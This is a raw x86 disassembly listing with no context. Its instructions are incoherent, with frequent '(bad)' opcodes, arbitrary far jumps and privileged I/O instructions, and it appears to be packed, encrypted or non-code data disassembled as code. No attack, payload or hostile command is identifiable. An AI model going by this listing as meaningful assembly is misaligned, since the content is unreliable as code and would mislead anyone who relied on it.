  42e4ea:	add    BYTE PTR [ecx],al
  42e4ec:	add    BYTE PTR [eax],al
  42e4ee:	and    edi,DWORD PTR [edi]
  42e4f0:	inc    ebx
  42e4f1:	mov    eax,0x228bb60c
  42e4f6:	mov    ecx,DWORD PTR [ecx]
  42e4f8:	pop    esi
  42e4f9:	xor    esi,edx
  42e4fb:	inc    ebp
  42e4fc:	fwait
  42e4fd:	cdq    
  42e4fe:	leave  
  42e4ff:	enter  0xc45b,0xda
  42e503:	jmp    0xc218:0xbdc6e1ac
  42e50a:	gs push ecx
  42e50c:	aad    0xbc
  42e50e:	fiadd  DWORD PTR [ecx+0x49cc7b09]
  42e514:	xchg   edx,eax
  42e515:	fwait
  42e516:	dec    eax
  42e517:	jb     0x42e530
  42e519:	imul   esp,DWORD PTR [esi],0xcfe7f709
  42e51f:	mov    dl,0xcc
  42e521:	push   cs
  42e522:	les    ebp,FWORD PTR [edi+0x50]
  42e525:	jg     0x42e4af
  42e527:	dec    edx
  42e528:	(bad)  
  42e529:	cmc    
  42e52a:	addr16 mov esi,0x82fa04fb
  42e530:	and    DWORD PTR [edi],ecx
  42e532:	mov    dl,0xa0
  42e534:	push   eax
  42e535:	mov    bh,0xe1
  42e537:	or     eax,0xbe259d18
  42e53c:	xchg   ebx,eax
  42e53d:	int3   
  42e53e:	sar    DWORD PTR [esi+0x1a],0x85
  42e542:	into   
  42e543:	test   al,0x8f
  42e545:	jbe    0x42e4ca
  42e547:	cmp    esi,DWORD PTR [ebp-0x1]
  42e54a:	mov    DWORD PTR [ebp-0x5a],0x3a7504d5
  42e551:	jecxz  0x42e52e
  42e553:	scas   al,BYTE PTR es:[edi]
  42e554:	adc    esi,DWORD PTR [ecx-0x5a]
  42e557:	cmp    ah,BYTE PTR [ecx]
  42e559:	stos   BYTE PTR es:[edi],al
  42e55a:	call   0x214d52f6
  42e55f:	pop    ebx
  42e560:	push   es
  42e561:	fbstp  TBYTE PTR [edx-0x73]
  42e564:	add    eax,DWORD PTR [esi]
  42e566:	adc    edi,DWORD PTR [edi]
  42e568:	and    ebp,DWORD PTR [edx-0x77da0fa6]
  42e56e:	adc    DWORD PTR [edi+0x6c],0x8cdd23f9
  42e575:	test   al,0x58
  42e577:	and    eax,0x73ebb7cf
  42e57c:	jmp    0x4132:0x588fca43
  42e583:	ret    0x7517
  42e586:	fdiv   QWORD PTR ds:0x8fdf38eb
  42e58c:	popf   
  42e58d:	scas   eax,DWORD PTR es:[edi]
  42e58e:	jecxz  0x42e598
  42e590:	scas   al,BYTE PTR es:[edi]
  42e591:	xchg   esi,eax
  42e592:	dec    ebx
  42e593:	test   DWORD PTR [ecx-0x5c],0x538a5d1
  42e59a:	les    eax,FWORD PTR [edi+esi*2]
  42e59d:	repnz adc ecx,esi
  42e5a0:	and    eax,0x4b5d7202
  42e5a5:	shl    DWORD PTR [esp+ebp*4],cl
  42e5a8:	test   eax,0x9c5fb6f9
  42e5ad:	shr    BYTE PTR [esi-0x1f],0x35
  42e5b1:	ins    DWORD PTR es:[edi],dx
  42e5b2:	aad    0xab
  42e5b4:	mov    bh,0x97
  42e5b6:	pop    esp
  42e5b7:	and    eax,0x1013f522
  42e5bc:	les    ebx,FWORD PTR [edi+0x35]
  42e5bf:	mov    ecx,gs
  42e5c1:	cmc    
  42e5c2:	pop    eax
  42e5c3:	mov    ds:0xadaa096c,eax
  42e5c8:	cmp    dh,bl
  42e5ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e5cb:	icebp  
  42e5cc:	jp     0x42e63f
  42e5ce:	ss (bad) 
  42e5d0:	fs in  eax,0x44
  42e5d3:	out    dx,al
  42e5d4:	xchg   ebx,eax
  42e5d5:	or     eax,0x18990309
  42e5da:	cld    
  42e5db:	lods   al,BYTE PTR ds:[esi]
  42e5dc:	cmp    eax,0x4ed0ac67
  42e5e1:	inc    ebp
  42e5e2:	fstp   DWORD PTR [ebx-0x15b1be88]
  42e5e8:	inc    esp
  42e5e9:	loopne 0x42e627
  42e5eb:	or     esi,DWORD PTR [eax+0x18]
	...
  42e655:	add    BYTE PTR [ebp+0x38],dl
  42e658:	into   
  42e659:	adc    bh,ch
  42e65b:	neg    bh
  42e65d:	jge    0x42e5f1
  42e65f:	xchg   ebp,eax
  42e660:	jns    0x42e693
  42e662:	xor    edx,DWORD PTR [ebp-0xe98b282]
  42e668:	add    DWORD PTR [eax],eax
  42e66a:	add    BYTE PTR [ecx],al
  42e66c:	add    BYTE PTR [eax],al
  42e66e:	pop    ebp
  42e66f:	mov    al,0x63
  42e671:	or     ah,al
  42e673:	jno    0x42e652
  42e675:	sahf   
  42e676:	rcl    BYTE PTR [ebx+ebx*8-0x3b],cl
  42e67a:	jno    0x42e688
  42e67c:	shr    ebp,cl
  42e67e:	jle    0x42e6e2
  42e680:	rcl    edx,0x27
  42e683:	or     BYTE PTR [edx+0x12993202],bh
  42e689:	add    esp,ebx
  42e68b:	stc    
  42e68c:	ret    
  42e68d:	aaa    
  42e68e:	scas   al,BYTE PTR es:[edi]
  42e68f:	jecxz  0x42e611
  42e691:	dec    BYTE PTR es:[edi+0x25b12030]
  42e698:	mov    al,BYTE PTR [edx+0x22]
  42e69b:	dec    ebp
  42e69c:	fwait
  42e69d:	je     0x42e6eb
  42e69f:	hlt    
  42e6a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e6a1:	out    0x34,al
  42e6a3:	xor    BYTE PTR [ebp-0x18],dl
  42e6a6:	xor    ah,BYTE PTR [eax-0x11817e1b]
  42e6ac:	out    0xf4,al
  42e6ae:	pop    eax
  42e6af:	lods   al,BYTE PTR ds:[esi]
  42e6b0:	xor    ebp,ecx
  42e6b2:	clc    
  42e6b3:	shl    DWORD PTR [edi],0x51
  42e6b6:	push   ss
  42e6b7:	jnp    0x42e695
  42e6b9:	fnstenv ds:0x4a4c4bbd
  42e6bf:	ins    BYTE PTR es:[edi],dx
  42e6c0:	sbb    al,0xac
  42e6c2:	nop
  42e6c3:	stos   DWORD PTR es:[edi],eax
  42e6c4:	cmp    eax,0x47f8a8cd
  42e6c9:	pop    eax
  42e6ca:	imul   edx,DWORD PTR [ebp+0x6e],0xd7336a49
  42e6d1:	push   ecx
  42e6d2:	jp     0x42e675
  42e6d4:	add    DWORD PTR [edx+edi*1+0x6c],0xffffffa5
  42e6d9:	adc    BYTE PTR [eax-0x4c],ch
  42e6dc:	mov    BYTE PTR [edx+0x8f6d7e8],ah
  42e6e2:	call   0xd4a1bb77
  42e6e7:	jle    0x42e71b
  42e6e9:	mov    BYTE PTR [eax+esi*2],ch
  42e6ec:	jno    0x42e75a
  42e6ee:	xchg   ebp,eax
  42e6ef:	dec    DWORD PTR [eax]
  42e6f1:	fstsw  WORD PTR [ebx+esi*8]
  42e6f5:	or     BYTE PTR [edx],ah
  42e6f7:	sbb    ebp,DWORD PTR [ebx+0x27]
  42e6fa:	cld    
  42e6fb:	pop    ebx
  42e6fc:	js     0x42e704
  42e6fe:	test   bl,dl
  42e700:	sbb    bl,0x95
  42e703:	and    edx,ebx
  42e705:	hlt    
  42e706:	adc    BYTE PTR [ebx-0xe],0xa8
  42e70a:	stos   DWORD PTR es:[edi],eax
  42e70b:	jno    0x42e747
  42e70d:	add    edi,DWORD PTR ds:0x149161d3
  42e713:	pop    ds
  42e714:	leave  
  42e715:	or     al,0xb1
  42e717:	mov    ebx,eax
  42e719:	xor    eax,0x298c0c87
  42e71e:	popa   
  42e71f:	test   DWORD PTR [ebx+0x58],ebx
  42e722:	loop   0x42e6cf
  42e724:	fbld   TBYTE PTR [esi+0x60]
  42e727:	add    eax,ebp
  42e729:	or     eax,0xdf192a00
  42e72e:	sbb    ebx,DWORD PTR [ebp+0x68]
  42e731:	pushf  
  42e732:	xor    eax,0x96c9742f
  42e737:	jg     0x42e72e
  42e739:	ret    0xe25
  42e73c:	data16 das 
  42e73e:	mov    edx,0x9410b309
  42e743:	outs   dx,DWORD PTR ds:[esi]
  42e744:	adc    ecx,edx
  42e746:	jg     0x42e784
  42e748:	mov    DWORD PTR [ebp-0x18],eax
  42e74b:	lods   eax,DWORD PTR ds:[esi]
  42e74c:	inc    esi
  42e74d:	nop    DWORD PTR [ecx]
  42e750:	jmp    0x42e7c3
  42e752:	push   esp
  42e753:	stos   BYTE PTR es:[edi],al
  42e754:	push   esp
  42e755:	xor    DWORD PTR ds:0x321432e4,eax
  42e75b:	add    DWORD PTR [edx+eiz*2+0x5a],0x2789367f
  42e763:	inc    ebp
  42e764:	enter  0xfc85,0xb9
  42e768:	mov    ds:0x186b627,eax
  42e76d:	mov    eax,DWORD PTR [eax]
	...
  42e7d3:	add    BYTE PTR [eax],al
  42e7d5:	add    BYTE PTR [edx+0x39],bl
  42e7d8:	dec    esi
  42e7d9:	sub    eax,0x7f7b7f6f
  42e7de:	sub    BYTE PTR fs:[esi],cl
  42e7e1:	fidiv  DWORD PTR [edi]
  42e7e3:	in     al,dx
  42e7e4:	pop    ss
  42e7e5:	dec    ecx
  42e7e6:	repnz add DWORD PTR [bx+si],eax
  42e7ea:	add    BYTE PTR [ecx],al
  42e7ec:	add    BYTE PTR [eax],al
  42e7ee:	add    al,0x22
  42e7f0:	add    eax,DWORD PTR [ebx+edi*2-0x72]
  42e7f4:	xchg   ebx,eax
  42e7f5:	mov    edi,?
  42e7f7:	adc    ch,ah
  42e7f9:	stc    
  42e7fa:	push   cs
  42e7fb:	iret   
  42e7fc:	add    dh,BYTE PTR [edi-0x7a7780d4]
  42e802:	fild   WORD PTR [ecx-0x3deea8d3]
  42e808:	(bad)  
  42e809:	loope  0x42e7b9
  42e80b:	push   edx
  42e80c:	adc    ch,bl
  42e80e:	fisubr WORD PTR [edi-0x4ec138c5]
  42e814:	inc    ebx
  42e815:	cmp    al,0x5f
  42e817:	outs   dx,BYTE PTR ds:[esi]
  42e818:	test   DWORD PTR [ecx+0x24afab96],0x4a687771
  42e822:	mov    esi,0x3361c941
  42e827:	dec    ecx
  42e828:	dec    esi
  42e829:	dec    esp
  42e82a:	inc    esp
  42e82b:	scas   eax,DWORD PTR es:[edi]
  42e82c:	cwde   
  42e82d:	mov    ds:0xa2aae914,al
  42e832:	jmp    0x67e3603a
  42e837:	pop    edi
  42e838:	(bad)  
  42e839:	jle    0x42e880
  42e83b:	into   
  42e83c:	iret   
  42e83d:	jae    0x42e809
  42e83f:	inc    edi
  42e840:	sub    esi,ebp
  42e842:	sbb    ah,dl
  42e844:	pusha  
  42e845:	and    ecx,edi
  42e847:	xchg   DWORD PTR [esi+0x14],ebp
  42e84a:	or     dl,dh
  42e84c:	cwde   
  42e84d:	jmp    0x42e80d
  42e84f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e850:	into   
  42e851:	bound  eax,QWORD PTR [esi+edx*4-0x53]
  42e855:	ret    0x497b
  42e858:	lods   eax,DWORD PTR ds:[esi]
  42e859:	xchg   esi,eax
  42e85a:	jbe    0x42e8c8
  42e85c:	test   al,0x5d
  42e85e:	ds mov esp,0xb3be75f0
  42e864:	adc    eax,DWORD PTR [ebx+esi*8]
  42e867:	mov    ebp,0x89acaea6
  42e86c:	stos   BYTE PTR es:[edi],al
  42e86d:	lods   eax,DWORD PTR fs:[esi]
  42e86f:	int    0xe3
  42e871:	push   ds
  42e872:	outs   dx,DWORD PTR ds:[esi]
  42e873:	jae    0x42e8ee
  42e875:	push   0x5f685609
  42e87a:	push   edx
  42e87b:	wrmsr  
  42e87d:	scas   eax,DWORD PTR es:[edi]
  42e87e:	fild   DWORD PTR ds:0x3f05d21b
  42e884:	cmp    BYTE PTR [ebx-0x5000a928],bl
  42e88a:	push   0xaafd4803
  42e88f:	dec    ebx
  42e890:	cmp    al,0x80
  42e892:	pop    edx
  42e893:	xchg   DWORD PTR [ebx],esi
  42e895:	fild   QWORD PTR [eax+0x3e]
  42e898:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e899:	jnp    0x42e83d
  42e89b:	outs   dx,DWORD PTR ds:[esi]
  42e89c:	sbb    DWORD PTR [ecx-0xb],ebp
  42e89f:	test   eax,0x25d8ec9e
  42e8a4:	std    
  42e8a5:	xor    al,bl
  42e8a7:	popf   
  42e8a8:	popf   
  42e8a9:	leave  
  42e8aa:	mov    ds:0xb41d0184,al
  42e8af:	sar    BYTE PTR [esi],0x76
  42e8b2:	cmp    al,0x71
  42e8b4:	sbb    BYTE PTR [esi+0x30710586],dl
  42e8ba:	fwait
  42e8bb:	or     BYTE PTR [esi-0x5f],ch
  42e8be:	xor    eax,0xa330b5a3
  42e8c3:	lock dec ebp
  42e8c5:	dec    ecx
  42e8c6:	dec    esp
  42e8c7:	push   edi
  42e8c8:	and    cl,bl
  42e8ca:	stos   DWORD PTR es:[edi],eax
  42e8cb:	jno    0x42e91a
  42e8cd:	ret    0x267b
  42e8d0:	jmp    0x42e8d0
  42e8d2:	into   
  42e8d3:	fdiv   DWORD PTR [esi+ebp*8+0x518493d4]
  42e8da:	adc    esp,ebx
  42e8dc:	adc    al,0x68
  42e8de:	jbe    0x42e915
  42e8e0:	out    dx,al
  42e8e1:	sbb    dh,BYTE PTR [edi+0x721ff404]
  42e8e7:	pop    ss
  42e8e8:	mov    al,0x5c
  42e8ea:	add    bl,ch
  42e8ec:	or     al,BYTE PTR [esi]
	...
  42e956:	ret    
  42e957:	ja     0x42e9b9
  42e959:	and    al,0xf4
  42e95b:	aaa    
  42e95c:	(bad)  
  42e95d:	div    DWORD PTR [ecx-0x3fdc07d5]
  42e963:	xor    bh,ah
  42e965:	sti    
  42e966:	repz add DWORD PTR [bx+si],eax
  42e96a:	add    BYTE PTR [ecx],al
  42e96c:	add    BYTE PTR [eax],al
  42e96e:	stos   DWORD PTR es:[edi],eax
  42e96f:	and    ebp,edx
  42e971:	add    DWORD PTR [esi],esi
  42e973:	and    bl,bl
  42e975:	pop    ds
  42e976:	ror    ah,cl
  42e978:	sbb    esp,edx
  42e97a:	shr    BYTE PTR [eax],0xb9
  42e97d:	xlat   BYTE PTR ds:[ebx]
  42e97e:	and    esi,DWORD PTR [edx]
  42e980:	jmp    0x2bdb:0x8b21f9d0
  42e987:	cli    
  42e988:	push   0x1c
  42e98a:	rcl    DWORD PTR [eax+0x7e7b0d9a],1
  42e990:	xlat   BYTE PTR ds:[ebx]
  42e991:	sti    
  42e992:	cmp    edi,DWORD PTR [eax-0x5148b78e]
  42e998:	pop    ecx
  42e999:	mov    ebp,eax
  42e99b:	ret    
  42e99c:	or     ebp,DWORD PTR [esi-0x4a50ae4d]
  42e9a2:	lods   eax,DWORD PTR ds:[esi]
  42e9a3:	fdivr  QWORD PTR [edi-0x40]
  42e9a6:	test   BYTE PTR [ebx],dl
  42e9a8:	lea    ebp,[ebx+0x2a]
  42e9ab:	push   es
  42e9ac:	xchg   ebx,eax
  42e9ad:	shl    BYTE PTR [eax],cl
  42e9af:	sti    
  42e9b0:	fs xor eax,0xaa60c710
  42e9b6:	fdivr  DWORD PTR fs:[ebp-0x38711dd7]
  42e9bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e9be:	sti    
  42e9bf:	or     ebx,edi
  42e9c1:	icebp  
  42e9c2:	push   eax
  42e9c3:	mov    BYTE PTR [ebx+0x48],0xb9
  42e9c7:	push   esi
  42e9c8:	sub    dh,al
  42e9ca:	sbb    al,cl
  42e9cc:	sub    DWORD PTR [esi+edx*2],ebx
  42e9cf:	mov    fs,WORD PTR [ebx+edi*1]
  42e9d2:	lods   eax,DWORD PTR ds:[esi]
  42e9d3:	mov    ds:0x1eb9c569,eax
  42e9d8:	or     dl,BYTE PTR [edi]
  42e9da:	loope  0x42e96a
  42e9dc:	leave  
  42e9dd:	and    al,BYTE PTR [ebx+ebx*1-0x79bb671a]
  42e9e4:	push   edx
  42e9e5:	mov    al,ds:0xe3aad835
  42e9ea:	retf   
  42e9eb:	cmp    bl,dh
  42e9ed:	je     0x42e9d1
  42e9ef:	mov    ds:0x2e080adf,eax
  42e9f4:	and    DWORD PTR [eiz*2-0x3cf16c58],esp
  42e9fb:	mov    ebp,0xe59599c1
  42ea00:	cmp    eax,0xc46b9bbe
  42ea05:	shl    edi,1
  42ea07:	xchg   edi,eax
  42ea08:	xchg   edi,eax
  42ea09:	inc    edi
  42ea0a:	cmp    eax,0x14310038
  42ea0f:	(bad)  
  42ea10:	fwait
  42ea11:	lea    edi,[eax+0x28]
  42ea14:	out    dx,al
  42ea15:	dec    eax
  42ea16:	dec    ebx
  42ea17:	dec    esp
  42ea18:	aas    
  42ea19:	test   eax,0x74fc1a94
  42ea1e:	daa    
  42ea1f:	loopne 0x42ea2a
  42ea21:	xor    ebx,0x1988fd14
  42ea27:	dec    bp
  42ea29:	mov    dh,BYTE PTR [edx]
  42ea2b:	pop    ss
  42ea2c:	cdq    
  42ea2d:	or     eax,0x55d61d23
  42ea32:	call   eax
  42ea34:	loope  0x42e9e2
  42ea36:	ja     0x42ea28
  42ea38:	out    0x5b,eax
  42ea3a:	xchg   ebx,eax
  42ea3b:	les    ebp,FWORD PTR [eax+ecx*1+0x47]
  42ea3f:	outs   dx,BYTE PTR ds:[esi]
  42ea40:	sbb    edi,ebp
  42ea42:	push   ebp
  42ea43:	icebp  
  42ea44:	fs push cs
  42ea46:	jae    0x42e9f8
  42ea48:	xor    DWORD PTR [edi+eax*1+0x4c82e851],edx
  42ea4f:	jnp    0x42ea6d
  42ea51:	gs imul ecx,esi,0x831022e9
  42ea58:	jle    0x42ea1a
  42ea5a:	dec    ebx
  42ea5b:	xlat   BYTE PTR ds:[ebx]
  42ea5c:	mov    dl,0xe4
  42ea5e:	cmp    BYTE PTR [esi-0x55b893db],ah
  42ea64:	into   
  42ea65:	pop    ebp
  42ea66:	out    0xc1,al
  42ea68:	cwde   
  42ea69:	adc    eax,0x4773c0f
	...
  42ead6:	in     eax,0xba
  42ead8:	xchg   edx,eax
  42ead9:	jecxz  0x42eaba
  42eadb:	jmp    0x42ead2
  42eadd:	mov    esi,0x66dc160c
  42eae2:	jg     0x42eaf7
  42eae4:	dec    edx
  42eae5:	mul    BYTE PTR [edi-0xc]
  42eae8:	add    DWORD PTR [eax],eax
  42eaea:	add    BYTE PTR [ecx],al
  42eaec:	add    BYTE PTR [eax],al
  42eaee:	and    edi,DWORD PTR [ecx+0x53]
  42eaf1:	dec    ebp
  42eaf2:	pop    es
  42eaf3:	xchg   esi,eax
  42eaf4:	mov    ds:0xce09e9c6,al
  42eaf9:	lods   eax,DWORD PTR ds:[esi]
  42eafa:	(bad)  
  42eafb:	scas   eax,DWORD PTR es:[edi]
  42eafc:	cmc    
  42eafd:	xlat   BYTE PTR ds:[ebx]
  42eafe:	add    DWORD PTR [edi-0x24],0x50
  42eb02:	repnz mov ebp,0x9299f542
  42eb08:	fsubr  st(1),st
  42eb0a:	mov    eax,0xac5b74e6
  42eb0f:	inc    ebp
  42eb10:	mov    bl,0x48
  42eb12:	add    BYTE PTR [ebp-0x5cc98eb3],bh
  42eb18:	pop    ebp
  42eb19:	mov    ebx,0x8d1a9dd1
  42eb1e:	pop    ds
  42eb1f:	mov    ch,0xdf
  42eb21:	and    eax,0x9ba61f74
  42eb26:	inc    esp
  42eb27:	(bad)  
  42eb28:	push   ebp
  42eb29:	arpl   WORD PTR [ebp+eax*2+0x6144a2fc],ax
  42eb30:	sbb    dh,BYTE PTR [edx-0x2a071b92]
  42eb36:	inc    ebp
  42eb37:	fmulp  st(1),st
  42eb39:	cmp    esp,DWORD PTR [edx]
  42eb3b:	mov    edi,0xccbb6fe
  42eb40:	and    BYTE PTR [ebx],bl
  42eb42:	dec    ebp
  42eb43:	popf   
  42eb44:	xor    ebx,esi
  42eb46:	sahf   
  42eb47:	and    eax,DWORD PTR [ebp+0x2c93f2c]
  42eb4d:	cmp    DWORD PTR [ebp-0x4],0x70
  42eb51:	cs jbe 0x42ebb2
  42eb54:	shl    DWORD PTR [edi],0x77
  42eb57:	mov    ah,0x52
  42eb59:	aaa    
  42eb5a:	cmp    ah,BYTE PTR [ebx]
  42eb5c:	add    ebx,edx
  42eb5e:	out    0xd5,al
  42eb60:	adc    eax,DWORD PTR [edi-0x20996db3]
  42eb66:	lods   al,BYTE PTR ds:[esi]
  42eb67:	imul   BYTE PTR [esi-0x5d]
  42eb6a:	adc    al,0x98
  42eb6c:	ficomp DWORD PTR [ecx]
  42eb6e:	loop   0x42eb05
  42eb70:	push   0x51656da8
  42eb75:	jg     0x42eb91
  42eb77:	push   esi
  42eb78:	loop   0x42ebb2
  42eb7a:	pop    ecx
  42eb7b:	dec    eax
  42eb7c:	push   ebp
  42eb7d:	and    ah,ch
  42eb7f:	bound  esp,QWORD PTR [ecx-0x45]
  42eb82:	lds    esi,FWORD PTR [eax+eax*2]
  42eb85:	into   
  42eb86:	xor    eax,0xcc0561e2
  42eb8b:	inc    edi
  42eb8c:	or     edi,DWORD PTR [esi-0x36]
  42eb8f:	sahf   
  42eb90:	xor    DWORD PTR [ecx-0x54],0x908825a2
  42eb97:	cmp    BYTE PTR [ebp+0x76],dh
  42eb9a:	adc    ecx,ebp
  42eb9c:	scas   eax,DWORD PTR es:[edi]
  42eb9d:	pusha  
  42eb9e:	push   cs
  42eb9f:	or     bh,BYTE PTR [edx-0x8605e12]
  42eba5:	fcomp  QWORD PTR [eax+0x303e41c3]
  42ebab:	inc    edi
  42ebac:	add    al,0x44
  42ebae:	data16 mov al,ds:0x6a796478
  42ebb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ebb5:	out    0x1b,eax
  42ebb7:	scas   al,BYTE PTR es:[edi]
  42ebb8:	sbb    eax,0x69c0eaa5
  42ebbd:	fstp   TBYTE PTR [eax-0x757bd828]
  42ebc3:	sbb    BYTE PTR [ebp-0x5cc55b22],bl
  42ebc9:	int    0xdb
  42ebcb:	les    eax,FWORD PTR [eax+ebp*4+0x2a]
  42ebcf:	mov    ebp,0xc90591df
  42ebd4:	adc    eax,0x893dda9a
  42ebd9:	das    
  42ebda:	(bad)  
  42ebdb:	push   0xe2d46a6d
  42ebe0:	out    0xb9,al
  42ebe2:	push   ds
  42ebe3:	jge    0x42ec29
  42ebe5:	jl     0x42ec61
  42ebe7:	pop    eax
  42ebe8:	ret    
  42ebe9:	adc    al,0xcb
  42ebeb:	and    al,0x46
  42ebed:	mov    esp,0x0
	...
  42ec56:	jle    0x42ec99
  42ec58:	jne    0xfc41bb9d
  42ec5e:	pusha  
  42ec5f:	popf   
  42ec60:	pop    ecx
  42ec61:	adc    edi,0x67e8ac32
  42ec67:	cmc    
  42ec68:	add    DWORD PTR [eax],eax
  42ec6a:	add    BYTE PTR [ecx],al
  42ec6c:	add    BYTE PTR [eax],al
  42ec6e:	mov    ecx,0x126780c6
  42ec73:	(bad)  
  42ec74:	and    eax,0xd8a4aee4
  42ec79:	xchg   esp,eax
  42ec7a:	test   bl,cl
  42ec7c:	mov    dl,0xa0
  42ec7e:	in     al,0x5c
  42ec80:	dec    edx
  42ec81:	sbb    DWORD PTR [ecx-0x3b],0x27
  42ec85:	ss scas al,BYTE PTR es:[edi]
  42ec87:	mov    ?,esi
  42ec89:	test   eax,0x56d52f25
  42ec8e:	or     DWORD PTR [eax+ebp*8+0x1007b9fb],esi
  42ec95:	jae    0x42ecdf
  42ec97:	jmp    0x42ec43
  42ec99:	sbb    DWORD PTR ds:0x46a0f47a,0x4d
  42eca0:	pop    es
  42eca1:	outs   dx,DWORD PTR ds:[esi]
  42eca2:	adc    DWORD PTR [ebp-0x64],edx
  42eca5:	ret    
  42eca6:	mov    ebx,0x197394bb
  42ecab:	je     0x42ed1a
  42ecad:	call   0x41877355
  42ecb2:	enter  0x3f71,0x7e
  42ecb6:	lods   al,BYTE PTR ds:[esi]
  42ecb7:	jbe    0x42ed2a
  42ecb9:	mov    al,ds:0xfde92743
  42ecbe:	push   ebx
  42ecbf:	push   eax
  42ecc0:	idiv   BYTE PTR [edx-0xd7444c7]
  42ecc6:	ret    0x5c5f
  42ecc9:	idiv   DWORD PTR [esi-0x20]
  42eccc:	call   0x7fc7:0x6ff6ddd0
  42ecd3:	out    0xce,eax
  42ecd5:	out    dx,eax
  42ecd6:	adc    al,0xb4
  42ecd8:	jb     0x42ec81
  42ecda:	cmp    ecx,DWORD PTR [esi+0x4bd970e1]
  42ece0:	outs   dx,DWORD PTR ds:[esi]
  42ece1:	pop    ss
  42ece2:	xchg   ecx,eax
  42ece3:	arpl   WORD PTR [edx-0x3d],cx
  42ece6:	lods   eax,DWORD PTR ds:[esi]
  42ece7:	aad    0x5d
  42ece9:	push   es
  42ecea:	(bad)  
  42eceb:	out    dx,al
  42ecec:	shr    dh,1
  42ecee:	cld    
  42ecef:	adc    ah,BYTE PTR [edx]
  42ecf1:	(bad)  
  42ecf2:	iret   
  42ecf3:	loope  0x42ed32
  42ecf5:	pop    ebx
  42ecf6:	dec    edx
  42ecf7:	inc    edi
  42ecf8:	and    DWORD PTR [eax],esi
  42ecfa:	mov    ds:0xa0759c7f,al
  42ecff:	in     eax,dx
  42ed00:	retf   
  42ed01:	cmp    ebx,eax
  42ed03:	add    al,0x84
  42ed05:	aad    0x7f
  42ed07:	pop    edi
  42ed08:	lods   al,BYTE PTR ds:[esi]
  42ed09:	mov    eax,0x9bf05821
  42ed0e:	inc    eax
  42ed0f:	sub    BYTE PTR [ecx-0xc4e8697],ch
  42ed15:	jmp    0x4c9f:0x3738821e
  42ed1c:	icebp  
  42ed1d:	push   DWORD PTR [ebx+0x1444748b]
  42ed23:	repz lahf 
  42ed25:	retf   
  42ed26:	push   eax
  42ed27:	add    BYTE PTR [ebx-0x768ad197],ah
  42ed2d:	fsubrp st(6),st
  42ed2f:	(bad)  
  42ed30:	lea    edx,[ebx-0x23]
  42ed33:	inc    ebx
  42ed34:	out    dx,eax
  42ed35:	dec    esi
  42ed36:	(bad)  [ebx+0x77cf4b6c]
  42ed3c:	mov    ecx,0xbf4f9e34
  42ed41:	mov    ebp,0x4094c898
  42ed46:	in     al,dx
  42ed47:	sbb    ah,BYTE PTR [ebx-0x6f]
  42ed4a:	push   ds
  42ed4b:	aas    
  42ed4c:	and    ebp,DWORD PTR [edi-0x4d]
  42ed4f:	or     BYTE PTR [esi],ah
  42ed51:	dec    edx
  42ed52:	out    0x8b,eax
  42ed54:	dec    ebx
  42ed55:	jp     0x42edce
  42ed57:	xchg   esp,eax
  42ed58:	(bad)  
  42ed59:	lods   al,BYTE PTR ds:[esi]
  42ed5a:	mov    eax,ds:0xea61e297
  42ed5f:	inc    ebp
  42ed60:	xchg   esi,eax
  42ed61:	int3   
  42ed62:	mov    ecx,0x501c92c2
  42ed67:	scas   al,BYTE PTR es:[edi]
  42ed68:	mov    al,ds:0xe65fbdb0
  42ed6d:	data16 add BYTE PTR [eax],al
	...
  42edd4:	add    BYTE PTR [eax],al
  42edd6:	sub    dh,dh
  42edd8:	scas   eax,DWORD PTR es:[edi]
  42edd9:	fdivr  st,st(7)
  42eddb:	fnstcw WORD PTR [edi-0xa]
  42edde:	jecxz  0x42ee12
  42ede0:	test   DWORD PTR [edx+0x13b2a114],esp
  42ede6:	test   BYTE PTR [bx+di],0x0
  42edea:	add    BYTE PTR [ecx],al
  42edec:	add    BYTE PTR [eax],al
  42edee:	(bad)  
  42edef:	cs retf 0xf00c
  42edf3:	hlt    
  42edf4:	inc    eax
  42edf5:	mov    edx,0x94155b10
  42edfa:	push   es
  42edfb:	xor    al,0x83
  42edfd:	cmp    al,0xfd
  42edff:	enter  0xbe85,0xd9
  42ee03:	daa    
  42ee04:	popf   
  42ee05:	jbe    0x42edf0
  42ee07:	fwait
  42ee08:	cld    
  42ee09:	adc    eax,0x2a0bdddf
  42ee0e:	pop    es
  42ee0f:	aas    
  42ee10:	inc    esp
  42ee11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ee12:	cmc    
  42ee13:	adc    bh,ah
  42ee15:	in     eax,dx
  42ee16:	sbb    esp,DWORD PTR [esi]
  42ee18:	cs mov cl,0x5c
  42ee1b:	lahf   
  42ee1c:	cmp    BYTE PTR [ebx+edi*8],dh
  42ee1f:	mov    ds:0xcee3736a,al
  42ee24:	xchg   BYTE PTR [edx],bh
  42ee26:	clc    
  42ee27:	xor    DWORD PTR [edi-0xcba5b13],edi
  42ee2d:	mov    dh,0x8c
  42ee2f:	adc    al,0xe1
  42ee31:	ds cmp eax,0x604955ea
  42ee37:	pop    ds
  42ee38:	sub    eax,0x86163248
  42ee3d:	push   esi
  42ee3e:	mov    BYTE PTR [eax-0x1ff5a035],ch
  42ee44:	ins    DWORD PTR es:[edi],dx
  42ee45:	mov    edx,0xbf3a2635
  42ee4a:	nop
  42ee4b:	(bad)  
  42ee4c:	mov    ?,WORD PTR [ecx]
  42ee4e:	mov    ebx,0x763b4221
  42ee53:	test   BYTE PTR [edx],0xb1
  42ee56:	fs mov ebx,0x182cf0b6
  42ee5c:	dec    ecx
  42ee5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ee5e:	cmp    eax,0x300078c0
  42ee63:	push   0x1c
  42ee65:	xchg   edi,eax
  42ee66:	sbb    cl,BYTE PTR [ebp+0x108e56ef]
  42ee6c:	(bad)  
  42ee6d:	imul   ebx,esi,0x9bf855e4
  42ee73:	mov    edx,0x5a69e0dd
  42ee78:	jmp    0x42ee73
  42ee7a:	arpl   cx,si
  42ee7c:	sti    
  42ee7d:	jno    0x42ee06
  42ee7f:	ins    DWORD PTR es:[edi],dx
  42ee80:	cmp    ebx,DWORD PTR [ebx-0x6e037594]
  42ee86:	cmp    al,BYTE PTR [ebp-0x67]
  42ee89:	rcr    DWORD PTR [esi],cl
  42ee8b:	(bad)  
